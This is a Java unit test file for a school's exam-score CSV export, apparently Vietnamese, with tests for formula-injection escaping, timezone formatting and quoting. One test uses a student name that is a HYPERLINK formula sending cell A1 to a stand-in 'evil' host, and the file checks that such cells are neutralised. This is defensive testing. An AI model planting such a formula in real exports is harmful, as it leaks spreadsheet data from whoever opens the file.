package com.sep.vox.application.usecase.examgrading;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import java.math.BigDecimal;
import java.time.OffsetDateTime;
import java.util.List;
import java.util.UUID;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import com.sep.vox.application.port.input.query.ExportExamScoresQuery;
import com.sep.vox.application.port.input.service.ExamGradingAccessService;
import com.sep.vox.application.port.input.usecase.examgrading.ExportExamScoresUseCase;
import com.sep.vox.application.query.dto.ExamScoreRowInfo;
import com.sep.vox.application.query.repository.ExamGradingQueryRepository;

/**
 * File này được mở bằng Excel bởi school admin — tài khoản quyền cao nhất trong trường
 * — nên ô do người dùng nhập không được phép trở thành công thức (review BE-9), và một
 * lần bấm nhầm không được kéo cả trường ra RAM (review BE-10).
 */
class ExportExamScoresUseCaseTests {

    private ExamGradingQueryRepository examGradingQueryRepository;
    private ExamGradingAccessService examGradingAccessService;
    private ExportExamScoresUseCase useCase;

    private final UUID adminId = UUID.randomUUID();
    private final UUID schoolId = UUID.randomUUID();
    private final UUID examId = UUID.randomUUID();

    @BeforeEach
    void setUp() {
        examGradingQueryRepository = mock(ExamGradingQueryRepository.class);
        examGradingAccessService = mock(ExamGradingAccessService.class);
        useCase = new ExportExamScoresUseCase(examGradingQueryRepository, examGradingAccessService);

        when(examGradingAccessService.requireActiveUserId()).thenReturn(adminId);
        when(examGradingAccessService.requireCurrentSchoolId(adminId)).thenReturn(schoolId);
        when(examGradingQueryRepository.findScoreRows(any(), any(), any())).thenReturn(List.of());
    }

    private void givenRowWithStudentName(String studentName) {
        when(examGradingQueryRepository.findScoreRows(schoolId, examId, null)).thenReturn(List.of(
            new ExamScoreRowInfo(UUID.randomUUID(), studentName, "hs@example.com", "12A1",
                "IELTS Mock", OffsetDateTime.parse("2026-07-12T08:00:00+07:00"),
                new BigDecimal("7.50"), "B2", "RELEASED",
                "INITIAL", "UPHELD", "Cô Lan", null)));
    }

    private String export() {
        return useCase.execute(new ExportExamScoresQuery(examId, null));
    }

    @Test
    void should_require_an_exam_or_a_schedule_scope() {
        assertThatThrownBy(() -> useCase.execute(new ExportExamScoresQuery(null, null)))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("kỳ thi hoặc ca thi");

        verify(examGradingQueryRepository, never()).findScoreRows(any(), any(), any());
    }

    @Test
    void should_accept_a_schedule_only_scope() {
        var scheduleId = UUID.randomUUID();

        useCase.execute(new ExportExamScoresQuery(null, scheduleId));

        verify(examGradingQueryRepository).findScoreRows(schoolId, null, scheduleId);
    }

    @Test
    void should_neutralize_a_cell_that_starts_like_a_formula() {
        givenRowWithStudentName("=HYPERLINK(\"http://evil/?x=\"&A1,\"Nhấn vào đây\")");

        // Dấu nháy đơn phía trước là thứ ngăn Excel CHẠY ô này lúc mở file.
        assertThat(export()).contains("\"'=HYPERLINK(");
    }

    @Test
    void should_neutralize_the_other_formula_triggers_too() {
        for (var trigger : List.of("+", "-", "@")) {
            givenRowWithStudentName(trigger + "cmd");

            assertThat(export()).contains("\"'" + trigger + "cmd\"");
        }
    }

    @Test
    void should_leave_an_ordinary_name_untouched() {
        givenRowWithStudentName("Nguyễn Văn A");

        assertThat(export()).contains("\"Nguyễn Văn A\"").doesNotContain("'Nguyễn");
    }

    @Test
    void should_still_escape_quotes_inside_a_cell() {
        givenRowWithStudentName("Trần \"Bo\" Nam");

        assertThat(export()).contains("\"Trần \"\"Bo\"\" Nam\"");
    }

    @Test
    void should_print_the_sitting_time_in_vietnam_time() {
        givenRowWithStudentName("Nguyễn Văn A");

        // Nguồn là 08:00+07:00; in ra phải là 08:00 bất kể JVM chạy ở múi giờ nào.
        assertThat(export()).contains("\"08:00 12/07/2026\"");
    }

    @Test
    void should_end_every_line_with_crlf() {
        givenRowWithStudentName("Nguyễn Văn A");

        assertThat(export().lines()).hasSize(2);
        assertThat(export()).contains("\r\n").doesNotContain("\n\n");
    }
}
